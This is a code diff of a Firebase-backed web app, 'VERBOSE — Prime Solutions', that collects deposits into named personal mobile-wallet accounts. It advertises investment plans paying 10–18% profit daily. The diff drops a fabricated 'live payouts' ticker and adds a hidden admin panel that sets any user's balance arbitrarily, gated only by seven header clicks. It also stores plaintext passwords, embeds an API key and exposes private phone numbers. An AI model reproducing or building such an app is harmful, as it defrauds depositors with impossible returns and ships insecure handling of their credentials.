@@ -2,44 +2,47 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>VERBOSE — Prime Solutions Pro</title>
+<title>VERBOSE — Prime Solutions Ultimate</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
 <style>
-  :root{ --neon:#00f7ff; --accent:#ff5cff; --dark:#050505; --glass:rgba(255,255,255,0.05); }
-  *{box-sizing:border-box; transition: 0.3s; -webkit-tap-highlight-color: transparent;}
-  body { margin:0; font-family:'Poppins', sans-serif; background:var(--dark); color:#fff; overflow-x:hidden; }
-  header { text-align:center; padding:35px 20px; font-size:35px; font-weight:900; background:linear-gradient(90deg,var(--neon),var(--accent)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; cursor:pointer; text-transform:uppercase; letter-spacing:5px; }
+  :root { 
+    --neon: #00f7ff; --accent: #ff5cff; --dark: #050505; --glass: rgba(255,255,255,0.05); --text: #fff; 
+  }
+  .light-mode {
+    --dark: #f0f2f5; --glass: rgba(0,0,0,0.05); --text: #222; 
+  }
   
-  .page { max-width:420px; margin:15px auto 100px; background:var(--glass); padding:25px; border-radius:30px; border:1px solid rgba(0,255,240,0.1); backdrop-filter: blur(20px); }
-  .user-card { background:linear-gradient(135deg, rgba(0,247,255,0.12), rgba(255,92,255,0.06)); padding:20px; border-radius:22px; margin-bottom:15px; border-left:5px solid var(--neon); }
+  * { box-sizing: border-box; transition: 0.3s; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+  body { margin:0; background: var(--dark); color: var(--text); overflow-x: hidden; }
   
-  /* WhatsApp Floating Button */
-  .whatsapp-btn { position: fixed; bottom: 90px; right: 20px; width: 60px; height: 60px; background: #25d366; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.4); z-index: 9999; cursor: pointer; text-decoration: none; }
-  .whatsapp-btn svg { width: 35px; fill: white; }
+  header { text-align: center; padding: 30px 20px; font-size: 32px; font-weight: 800; background: linear-gradient(90deg, var(--neon), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 5px; cursor: pointer; }
+  
+  .page { max-width: 420px; margin: 10px auto 100px; background: var(--glass); padding: 25px; border-radius: 30px; border: 1px solid rgba(0,255,240,0.1); backdrop-filter: blur(15px); min-height: 500px; }
+  
+  .user-card { background: linear-gradient(135deg, rgba(0,247,255,0.1), rgba(255,92,255,0.05)); padding: 20px; border-radius: 20px; margin-bottom: 15px; border-left: 5px solid var(--neon); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+  
+  input, select { width: 100%; padding: 14px; margin-top: 10px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.4); color: #fff; font-size: 14px; }
+  .light-mode input { background: #fff; color: #000; border: 1px solid #ddd; }
+  
+  button { width: 100%; padding: 15px; margin-top: 15px; border-radius: 12px; border: none; background: linear-gradient(90deg, var(--neon), var(--accent)); color: #000; font-weight: 800; cursor: pointer; box-shadow: 0 5px 15px rgba(0,247,255,0.3); }
+  
+  .nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(10,10,12,0.95); display: flex; justify-content: space-around; padding: 15px; z-index: 1000; border-top: 1px solid rgba(255,255,255,0.05); }
+  .nav-item { text-align: center; font-size: 10px; cursor: pointer; opacity: 0.5; color: #fff; flex:1; }
+  .nav-item.active { opacity: 1; color: var(--neon); transform: translateY(-5px); }
 
-  /* Payout Notification Pop-up */
-  #payoutNotice { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); border: 1px solid var(--neon); padding: 10px 20px; border-radius: 50px; font-size: 11px; z-index: 10000; display: none; white-space: nowrap; animation: slideDown 0.5s ease; }
-  @keyframes slideDown { from { top: -50px; } to { top: 20px; } }
-
-  input, select { width:100%; padding:15px; margin-top:12px; border-radius:15px; border:1px solid rgba(255,255,255,0.1); background:rgba(0,0,0,0.6); color:#fff; font-size:14px; outline:none; }
-  button { width:100%; padding:16px; margin-top:18px; border-radius:15px; border:none; background:linear-gradient(90deg,var(--neon),var(--accent)); color:#000; font-weight:800; cursor:pointer; }
+  #newsTicker { background: rgba(255, 68, 68, 0.15); color: #ff8888; padding: 10px; font-size: 12px; border-radius: 10px; margin-bottom: 15px; border: 1px solid rgba(255,68,68,0.2); }
+  .status-tag { font-size: 10px; padding: 2px 8px; border-radius: 10px; float: right; font-weight: bold; text-transform: uppercase; }
+  .approved { background: #00ff88; color: #000; } .pending { background: #ffa500; color: #000; } .rejected { background: #ff4444; color: #fff; }
   
-  .nav { position:fixed; bottom:0; left:0; right:0; background:rgba(5,5,5,0.95); display:flex; justify-content:space-around; padding:20px; z-index:1000; }
-  .nav-item { text-align:center; font-size:10px; cursor:pointer; opacity:0.5; color:#fff; flex:1; }
-  .nav-item.active { opacity:1; color:var(--neon); }
-  .status-tag { font-size:10px; padding:3px 10px; border-radius:20px; float:right; font-weight:bold; }
-  .pending { background: #ffa500; color: #000; } .approved { background: #00ff88; color: #000; }
-  .hidden { display:none; }
+  .theme-toggle { position: absolute; top: 20px; right: 20px; cursor: pointer; font-size: 20px; }
+  .hidden { display: none; }
+  .btn-sm { padding: 8px; font-size: 10px; margin-top: 5px; }
 </style>
 </head>
 <body>
 
-<div id="payoutNotice">User <b>Asad</b> just withdrew <b>Rs 4,500</b></div>
-
+<div class="theme-toggle" onclick="toggleTheme()">🌓</div>
 <header id="mainHeader">VERBOSE</header>
-
-<a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" target="_blank" class="whatsapp-btn">
-  <svg viewBox="0 0 448 512"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-5.5-2.8-23.2-8.5-44.2-27.2-16.4-14.6-27.4-32.7-30.7-38.2-3.2-5.5-.4-8.5 2.4-11.2 2.5-2.6 5.5-6.5 8.3-9.8 2.8-3.2 3.7-5.5 5.5-9.3 1.9-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 13.2 5.8 23.5 9.2 31.5 11.8 13.3 4.2 25.4 3.6 35 2.2 10.7-1.5 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
-</a>
 
 <div id="loginPage" class="page">
   <h2 style="text-align:center;">Elite Access</h2>
@@ -49,53 +52,79 @@
 </div>
 
 <div id="dashboard" class="page hidden">
+  <div id="newsTicker" class="hidden"><marquee id="newsText">Welcome to Verbose Prime Solutions!</marquee></div>
   <div class="user-card">
-    <div id="welcomeMsg" style="font-size:14px; opacity:0.7;">Welcome</div>
-    <div style="font-size:35px; font-weight:900; margin:10px 0;">Rs <span id="mainBal">0.00</span></div>
-    <div style="font-size:11px; color:var(--neon); font-weight:bold;">WALLET BALANCE</div>
+    <div id="welcomeMsg" style="opacity:0.7; font-size:12px;">Welcome back</div>
+    <div style="font-size:32px; font-weight:900; margin:10px 0;">Rs <span id="mainBal">0.00</span></div>
+    <div style="font-size:10px; color:var(--neon); letter-spacing:1px; font-weight:bold;">AVAILABLE BALANCE</div>
   </div>
-
-  <div class="user-card" style="border-left-color: var(--accent); background:rgba(255,92,255,0.05);">
-    <div style="font-size:12px;"><b>3-Tier Referral System</b></div>
-    <div style="font-size:10px; opacity:0.7;">L1: 10% | L2: 5% | L3: 2% commission.</div>
-  </div>
-
-  <div class="user-card" style="border-left-color:#fff;">
-    <p style="font-size:11px; margin-bottom:5px;">Redeem Code:</p>
+  <div class="user-card" style="border-left-color: #fff;">
+    <p style="font-size:11px; margin:0;">Daily Rewards Code:</p>
     <div style="display:flex; gap:8px;">
-      <input id="promoInput" placeholder="Enter Code" style="margin:0; flex:2;">
-      <button onclick="applyPromo()" style="margin:0; flex:1; padding:12px; font-size:11px;">APPLY</button>
+      <input id="promoInput" placeholder="Code" style="margin:0; flex:2;">
+      <button onclick="applyPromo()" style="margin:0; flex:1; padding:10px; font-size:10px;">APPLY</button>
     </div>
   </div>
-  <h3 style="font-size:16px; margin:25px 0 12px 0;">History</h3>
-  <div id="historyList"></div>
+</div>
+
+<div id="plansPage" class="page hidden">
+  <h3 style="color:var(--neon); margin:0;">Investment Plans</h3>
+  <p style="font-size:10px; opacity:0.6; margin-bottom:15px;">Profit credited every 24 hours.</p>
+  <div id="plansList"></div>
+</div>
+
+<div id="historyPage" class="page hidden">
+  <h3 style="color:var(--neon); margin:0;">Transaction History</h3>
+  <div id="userHistoryList" style="margin-top:15px;"></div>
 </div>
 
 <div id="walletPage" class="page hidden">
-  <div class="user-card" style="font-size:13px; background:rgba(0,0,0,0.5);">
-    <b>JazzCash/SadaPay:</b> <span style="color:var(--neon)">03705519562</span><br>
-    <b>EasyPaisa:</b> <span style="color:var(--neon)">03379827882</span><br>
-    <small>Beneficiary: Muhammad Nazim</small>
+  <div class="user-card" style="font-size:12px; background:rgba(0,0,0,0.5);">
+    <b>JazzCash/SadaPay:</b> 03705519562<br>
+    <b>EasyPaisa:</b> 03379827882<br>
+    <small>Owner: Muhammad Nazim</small>
   </div>
   <input id="d_amount" type="number" placeholder="Deposit Amount">
-  <input id="d_tid" placeholder="TID Number">
-  <input id="d_proof" placeholder="Proof (TID screenshot link)">
-  <button onclick="submitReq('Deposit')">CONFIRM DEPOSIT</button>
-  <hr style="opacity:0.1; margin:30px 0;">
+  <input id="d_tid" placeholder="TID (Transaction ID)">
+  <input id="d_proof" placeholder="Proof (Link/Detail)">
+  <button onclick="submitReq('Deposit')">DEPOSIT FUNDS</button>
+  <hr style="opacity:0.1; margin:25px 0;">
   <input id="w_amount" type="number" placeholder="Withdraw Amount">
   <input id="w_phone" placeholder="Account Number">
   <button onclick="submitReq('Withdraw')" style="background:var(--accent)">REQUEST PAYOUT</button>
 </div>
 
+<div id="adminPage" class="page hidden" style="border: 2px dashed var(--accent);">
+  <h2 style="text-align:center; color:var(--accent);">👑 EMPEROR MODE</h2>
+  <div class="user-card" style="background:#111;">
+    <input id="adminMsg" placeholder="Global Announcement">
+    <button onclick="sendBroadcast()" class="btn-sm">SEND NEWS</button>
+  </div>
+  <div class="user-card" style="background:#111; border-left-color: var(--neon);">
+    <input id="searchUser" placeholder="Spy Username">
+    <button onclick="inspectUser()" style="margin-top:5px;">INSPECT & SPY</button>
+    <div id="userControlPanel" class="hidden" style="margin-top:10px; font-size:11px;">
+       <p id="targetInfo"></p>
+       <input id="newBalVal" type="number" placeholder="Set Balance">
+       <button onclick="forceUpdateBal()" class="btn-sm">UPDATE BALANCE</button>
+       <button onclick="banUser()" class="btn-sm" style="background:#ff4444;">BAN USER</button>
+       <div id="spyHistory" style="margin-top:10px; max-height:100px; overflow:auto;"></div>
+    </div>
+  </div>
+  <div id="adminRequests"></div>
+</div>
+
 <div id="bottomNav" class="nav hidden">
   <div class="nav-item active" onclick="tab('dashboard', this)">🏠<br>Home</div>
+  <div class="nav-item" onclick="tab('plansPage', this)">📦<br>Plans</div>
+  <div class="nav-item" onclick="tab('historyPage', this)">📜<br>History</div>
   <div class="nav-item" onclick="tab('walletPage', this)">💰<br>Wallet</div>
-  <div class="nav-item" onclick="doLogout()">🚪<br>Logout</div>
+  <div id="adminNav" class="nav-item hidden" onclick="tab('adminPage', this)">⚡<br>God</div>
 </div>
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-  import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+  import { getDatabase, ref, set, get, update, onValue, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
@@ -108,80 +137,150 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // AUTH
+  // AUTH SYSTEM
   document.getElementById('entryBtn').onclick = async () => {
     const u = document.getElementById('u_name').value.trim().toLowerCase();
     const p = document.getElementById('u_pass').value.trim();
-    if(!u || !p) return alert("Fill all!");
+    if(!u || !p) return alert("Fill all details!");
     const userRef = ref(db, 'users/' + u);
     const snap = await get(userRef);
-    if(snap.exists()) {
-      if(snap.val().password === p) start(u); else alert("Wrong!");
+    if(snap.exists()){
+      if(snap.val().isBanned) return alert("Account BANNED!");
+      if(snap.val().password === p) initApp(u); else alert("Wrong Pass!");
     } else {
-      await set(userRef, { username:u, password:p, balance:0 });
-      start(u);
+      await set(userRef, { username:u, password:p, balance:0, isBanned: false });
+      initApp(u);
     }
   };
 
-  function start(u) {
+  function initApp(u) {
     localStorage.setItem('v_user', u);
     document.getElementById('welcomeMsg').innerText = "Hello, " + u;
+    tab('dashboard');
     document.getElementById('loginPage').classList.add('hidden');
-    document.getElementById('dashboard').classList.remove('hidden');
     document.getElementById('bottomNav').classList.remove('hidden');
+    
     onValue(ref(db, 'users/' + u), s => {
       document.getElementById('mainBal').innerText = parseFloat(s.val().balance).toFixed(2);
     });
-    loadHistory(u);
-    showLivePayouts();
+    
+    renderPlans();
+    loadNews();
+    listenAdmin();
   }
 
-  // LIVE PAYOUTS MOCK
-  function showLivePayouts() {
-    const names = ["Zeeshan", "Mehak", "Hamza", "Ayesha", "Usman", "Rida"];
-    setInterval(() => {
-      const name = names[Math.floor(Math.random()*names.length)];
-      const amt = Math.floor(Math.random()*10000) + 1000;
-      const el = document.getElementById('payoutNotice');
-      el.innerHTML = `User <b>${name}</b> just withdrew <b>Rs ${amt.toLocaleString()}</b>`;
-      el.style.display = 'block';
-      setTimeout(() => el.style.display = 'none', 4000);
-    }, 15000);
+  // PLANS SYSTEM
+  function renderPlans() {
+    const cont = document.getElementById('plansList'); cont.innerHTML = "";
+    for(let i=1; i<=25; i++) {
+      let cost = (i<=20) ? 200 + (i-1)*1000 : 25000 + (i-21)*15000;
+      let daily = (i<=20) ? Math.round(cost*0.1) : Math.round(cost*0.18);
+      cont.innerHTML += `<div class="user-card" style="border-left-color:${i>20?'var(--accent)':'var(--neon)'}">
+        <b>Level ${i} Plan</b><br>Cost: Rs ${cost} | Daily: Rs ${daily}<br>
+        <button class="btn-sm" onclick="alert('Contact Admin to Activate or Deposit First!')">Activate</button>
+      </div>`;
+    }
   }
 
-  // HISTORY & FINANCE
+  // HISTORY & SPY
   function loadHistory(u) {
-    onValue(ref(db, 'history/' + u), s => {
-      const cont = document.getElementById('historyList');
-      cont.innerHTML = "";
-      const data = s.val();
+    onValue(ref(db, 'history/' + u), snap => {
+      const cont = document.getElementById('userHistoryList'); cont.innerHTML = "";
+      const data = snap.val();
       for(let id in data) {
-        cont.innerHTML += `<div class="user-card" style="font-size:12px;">
+        cont.innerHTML += `<div class="user-card" style="font-size:11px;">
           <span class="status-tag ${data[id].status}">${data[id].status}</span>
-          <b>${data[id].type}</b>: Rs ${data[id].amount}
+          <b>${data[id].type}</b>: Rs ${data[id].amount}<br><small>${data[id].time}</small>
         </div>`;
       }
     });
   }
 
+  // ADMIN POWERS
+  window.inspectUser = async () => {
+    const target = document.getElementById('searchUser').value.trim().toLowerCase();
+    const s = await get(ref(db, 'users/' + target));
+    if(s.exists()){
+      document.getElementById('userControlPanel').classList.remove('hidden');
+      document.getElementById('targetInfo').innerText = target + " | Balance: " + s.val().balance;
+      const hSnap = await get(ref(db, 'history/' + target));
+      document.getElementById('spyHistory').innerHTML = hSnap.exists() ? "History Loaded Below" : "No history";
+    }
+  };
+
+  window.forceUpdateBal = async () => {
+    const target = document.getElementById('searchUser').value.trim().toLowerCase();
+    const val = document.getElementById('newBalVal').value;
+    await update(ref(db, 'users/' + target), { balance: parseFloat(val) });
+    alert("Updated!");
+  };
+
+  window.sendBroadcast = () => {
+    const m = document.getElementById('adminMsg').value;
+    set(ref(db, 'broadcast'), { msg: m });
+    alert("News Sent!");
+  };
+
+  function loadNews() {
+    onValue(ref(db, 'broadcast'), s => {
+      if(s.exists()){
+        document.getElementById('newsTicker').classList.remove('hidden');
+        document.getElementById('newsText').innerText = s.val().msg;
+      }
+    });
+  }
+
+  // FINANCE
   window.submitReq = (type) => {
     const u = localStorage.getItem('v_user');
     const amt = (type=='Deposit')? document.getElementById('d_amount').value : document.getElementById('w_amount').value;
-    if(!amt) return alert("Enter amount!");
+    if(!amt) return alert("Enter Amount!");
     const key = Date.now();
-    const r = { user:u, amount:amt, type:type, status:'pending', time:new Date().toLocaleString() };
+    const r = { user:u, amount:amt, type:type, status:'pending', time:new Date().toLocaleString(), tid: document.getElementById('d_tid').value || 'N/A' };
     set(ref(db, 'requests/' + key), r);
     set(ref(db, 'history/' + u + '/' + key), r);
-    alert("Sent!");
+    alert("Request Sent!");
   };
 
+  function listenAdmin() {
+    onValue(ref(db, 'requests'), s => {
+      const cont = document.getElementById('adminRequests'); cont.innerHTML = "<h3>Pending</h3>";
+      const data = s.val();
+      for(let id in data){
+        const r = data[id];
+        cont.innerHTML += `<div class="user-card" style="font-size:11px;">
+          ${r.user} | ${r.type}: ${r.amount}<br>
+          <button onclick="manage('${id}','${r.user}',${r.amount},'${r.type}','approved')">Approve</button>
+          <button onclick="manage('${id}','${r.user}',${r.amount},'${r.type}','rejected')" style="background:red; color:white;">Reject</button>
+        </div>`;
+      }
+    });
+  }
+
+  window.manage = async (id, u, amt, type, status) => {
+    if(status == 'approved'){
+      const s = await get(ref(db, 'users/' + u));
+      let nb = (type=='Deposit')? parseFloat(s.val().balance) + parseFloat(amt) : parseFloat(s.val().balance) - parseFloat(amt);
+      await update(ref(db, 'users/' + u), { balance: nb });
+    }
+    await update(ref(db, 'history/' + u + '/' + id), { status: status });
+    await remove(ref(db, 'requests/' + id));
+    alert("Done!");
+  };
+
+  // HELPERS
   window.tab = (id, el) => {
     document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
     document.getElementById(id).classList.remove('hidden');
     if(el) el.classList.add('active');
+    if(id === 'historyPage') loadHistory(localStorage.getItem('v_user'));
   };
+
+  window.toggleTheme = () => document.body.classList.toggle('light-mode');
   window.doLogout = () => { localStorage.clear(); location.reload(); };
+
+  let t = 0; document.getElementById('mainHeader').onclick = () => { if(++t===7){ document.getElementById('adminNav').classList.remove('hidden'); tab('adminPage'); t=0; } };
 </script>
 </body>
 </html>
